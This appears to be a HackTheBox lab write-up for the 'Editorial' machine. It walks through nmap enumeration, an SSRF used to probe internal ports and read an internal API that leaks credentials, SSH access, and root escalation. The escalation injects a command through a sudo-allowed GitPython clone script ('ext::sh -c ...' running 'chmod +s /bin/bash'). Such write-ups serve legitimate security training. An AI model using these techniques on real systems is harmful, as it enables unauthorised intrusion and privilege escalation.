---
title: "Editorial"
date: 2025-05-16
categories:
  - HackTheBox
  - Linux
tags:
  - HackTheBox
  - Linux
---

# Editorial

![](../assets/Pasted%20image%2020250516195632.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.20
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-16 19:55 CEST
Nmap scan report for 10.10.11.20
Host is up (0.041s latency).
Not shown: 62780 closed tcp ports (reset), 2753 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   40.54 ms 10.10.14.1
2   41.36 ms 10.10.11.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.26 seconds
```

Add `editorial.htb` to `/etc/hosts`.

Browse the website:

![](../assets/Pasted%20image%2020250516195751.png)

![](../assets/Pasted%20image%2020250516200531.png)

There is a form to submit book information with a preview button that makes a request to get an image. You can put an external URL and the request goes through, so this is an SSRF vulnerability.

Examining the response with Caido, the response always returns a JPEG file.

![](../assets/Pasted%20image%2020250518121952.png)

We can try to enumerate internal ports by filtering the responses that do not return a `.jpg` file.

Using Caido's Automate, load a list of all ports and filter by `resp.raw.ncont:"jpeg"`.

![](../assets/Pasted%20image%2020250518122755.png)

The only internal port that is not returning a JPEG is `5000`.

Download the returned URL and see the content.

```shell
$ wget http://editorial.htb/static/uploads/47010b03-c3a5-47bf-b2bf-88eac775fb1a
--2025-05-18 13:16:57--  http://editorial.htb/static/uploads/47010b03-c3a5-47bf-b2bf-88eac775fb1a
Resolving editorial.htb (editorial.htb)... 10.10.11.20
Connecting to editorial.htb (editorial.htb)|10.10.11.20|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 911 [application/octet-stream]
Saving to: ‘47010b03-c3a5-47bf-b2bf-88eac775fb1a’

47010b03-c3a5-47bf-b2bf-88eac 100%[================================================>]     911  --.-KB/s    in 0s      

2025-05-18 13:16:57 (57.1 MB/s) - ‘47010b03-c3a5-47bf-b2bf-88eac775fb1a’ saved [911/911]
```

```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

Get the authors endpoint to find credentials in the message.

![](../assets/Pasted%20image%2020250518133613.png)

```shell
$ wget http://editorial.htb/static/uploads/99b69cd0-bc8c-4713-897f-207c8841e123

$ cat 99b69cd0-bc8c-4713-897f-207c8841e123 | jq .
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."                                                                                         
}
```

## Initial Access

Connect to the machine via `ssh`:

```shell
$ ssh dev@10.10.11.20           
The authenticity of host '10.10.11.20 (10.10.11.20)' can't be established.
ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.20' (ED25519) to the list of known hosts.
dev@10.10.11.20's password: 
Permission denied, please try again.
dev@10.10.11.20's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
dev@editorial:~$ whoami
dev
```

Get the flag:

```shell
dev@editorial:~$ cat user.txt
f9a7b485d37f289d6e983f00b029597f
```

## Privilege Escalation

Notice the `.git` folder in the user folder.

Explore all the commits and show diffs for the third one.

```shell
dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.
dev@editorial:~/apps$ git show 1e84a036b2f33c59e2390730699a488c65643d28
commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

```

```shell
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
```

The dev changed the user and password from `prod` to `dev`.

`prod:080217_Producti0n_2023!@`

Re-enter via `ssh`:

```ssh
$ ssh prod@10.10.11.20
prod@10.10.11.20's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


prod@editorial:~$ whoami
prod
```

This user can execute the following as `sudo`:

```ssh
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

```shell
prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Searching for an exploit, we find [SNYK-PYTHON-GITPYTHON-3113858](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858).

So create a simple script to change `/bin/bash` permissions.

```shell
prod@editorial:~$ cat script.sh 
chmod +s /bin/bash
```

And execute the `sudo` command:

```shell
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /home/prod/script.sh'
...
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c bash% /home/prod/script.sh new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
prod@editorial:~$ ls -alh /bin/bash
-rwsr-sr-x 1 root root 1.4M Mar 14  2024 /bin/bash

```

```shell
prod@editorial:~$ bash -p
bash-5.1# whoami
root
```

## Post Exploitation

Get the flag:

```shell
bash-5.1# cat /root/root.txt
8163e03aff595a294efd3116d4019ad5
```
